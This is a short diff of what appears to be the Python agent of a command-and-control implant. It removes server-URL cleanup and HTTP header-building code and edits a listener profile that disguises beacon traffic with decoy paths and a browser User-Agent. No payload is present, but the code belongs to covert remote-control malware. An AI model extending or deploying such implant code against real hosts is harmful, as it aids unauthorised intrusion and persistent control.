@@ -39,7 +39,6 @@ from threading import Thread
 # print "starting agent"
 
 
-if server.endswith("/"): server = server[0:-1]
 
 
 jobMessageBuffer = ''
@@ -53,26 +52,6 @@ workingHours = 'REPLACE_WORKINGHOURS'
 jobs = []
 moduleRepo = {}
 _meta_cache = {}
-
-
-# global header dictionary
-#   sessionID is set by stager.py
-# headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" %(sessionID)}
-headers = {'User-Agent': userAgent}
-
-# parse the headers into the global header dictionary
-for headerRaw in headersRaw:
-    try:
-        headerKey = headerRaw.split(":")[0]
-        headerValue = headerRaw.split(":")[1]
-
-        if headerKey.lower() == "cookie":
-            headers['Cookie'] = "%s;%s" %(headers['Cookie'], headerValue)
-        else:
-            headers[headerKey] = headerValue
-    except:
-        pass
-
 
 ################################################
 #
@@ -88,7 +67,6 @@ listeners = [
 #        'delay' : 60
 #        'jitter' : 0.0
 #        'profile': "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-#        'server': 10.10.10.10:8080,
 #        'fixed_parameters': {'param1': 12, 'param2': 'Mozilla'} #fixed immutable parameters used by the function such as the profile
 #        'send_func': myfunc,
 #        'lostLimit': 60,
